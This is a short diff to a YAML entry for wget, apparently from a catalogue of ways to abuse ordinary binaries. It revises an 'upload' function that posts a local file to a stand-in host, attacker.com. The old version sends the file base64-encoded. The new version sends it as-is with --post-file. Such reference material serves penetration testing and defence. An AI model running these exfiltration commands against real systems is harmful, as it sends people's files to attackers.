@@ -1,11 +1,11 @@
 ---
 functions:
   upload:
-    - description: Send base64-encoded local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
       code: |
         export URL=http://attacker.com/
         export LFILE=file_to_send
-        wget --post-data="d=$(base64 $LFILE | tr -d '\n')" $URL
+        wget --post-file=$LFILE $URL
   download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
